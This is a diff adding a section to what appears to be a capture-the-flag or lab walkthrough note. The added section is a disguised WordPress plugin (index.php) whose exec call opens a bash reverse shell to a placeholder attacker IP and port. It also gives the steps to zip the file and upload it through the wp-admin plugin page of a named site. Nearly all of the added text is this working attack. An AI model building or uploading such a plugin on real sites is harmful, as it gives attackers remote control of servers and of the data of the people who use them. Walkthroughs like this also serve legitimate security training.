@@ -91,3 +91,30 @@ remove /etc/known_hosts
 
 try to login as root 
 ![[Pasted image 20230930072943.png]]
+
+
+### INDEX.PHP SCRIPT
+
+Sudo index.php
+
+<?php
+
+/**
+
+* Author: Saeed Bala
+
+* Plugin Name: PHP Code Plugin
+
+* Description: Shell Through Plugins
+
+* Version: 1.0
+
+*/
+
+exec("/bin/bash -c 'bash -i >& /dev/tcp/**YOUR IP**/PORT 0>&1'");
+
+?>
+
+zip -r plug.zip index.php
+
+Then, Navigate to http://alvida-eatery.org/wp-admin/plugins.php → Add New → Upload Plugin
